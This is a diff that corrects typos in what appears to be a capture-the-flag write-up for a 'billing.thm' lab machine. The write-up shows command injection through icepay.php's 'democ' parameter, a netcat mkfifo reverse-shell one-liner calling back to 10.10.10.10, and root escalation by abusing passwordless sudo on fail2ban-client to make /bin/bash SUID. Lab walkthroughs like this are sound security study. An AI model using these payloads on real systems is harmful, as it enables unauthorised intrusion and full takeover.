@@ -87,15 +87,15 @@ Result: This PoC attempts to inject the id command.
 
 ## 💥 Exploitation:
 
-I have tried `http://billing.thm/lib/icepay/icepay.php?democ=testfile; id > /tmp/x.txt;` but the file was not created under `http://billing.thm/tmp.x.txt`, so i have started a icmp listener with `tcpdump` and tried `http://billing.thm/lib/icepay/icepay.php?democ=testfile;ping -c 3 10.10.10.10;` which was successful so rce is verified.
+I have tried `http://billing.thm/lib/icepay/icepay.php?democ=testfile; id > /tmp/x.txt;` but the file was not created under `http://billing.thm/tmp/x.txt`, so i have started a icmp listener with `tcpdump` and tried `http://billing.thm/lib/icepay/icepay.php?democ=testfile;ping -c 3 10.10.10.10;` which was successful, so rce is verified.
 
 I have started a `netcat` listener and with the payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f` i got a shell as the user `asterisk`.
 
-I found the `user.txt` inside of the user `magnus` home directory, which is world readable so i was able to just grab the flag.
+I found the `user.txt` inside of the user `magnus` home directory, which is world readable, so i was able to just grab the flag.
 
 ## 🔓 Priviledge Escalation:
 
-I found out with `sudo -l` that i was able to execute the `fail2ban-client` as root without providing a password which i have abused to set the suid bit on `/bin/bash` and gain a root shell to read the `root.txt`.
+I found out with `sudo -l`, that i was able to execute the `fail2ban-client` as root without providing a password, which i have abused to set the suid bit on `/bin/bash` and gain a root shell to read the `root.txt`.
 
 ```
 ...
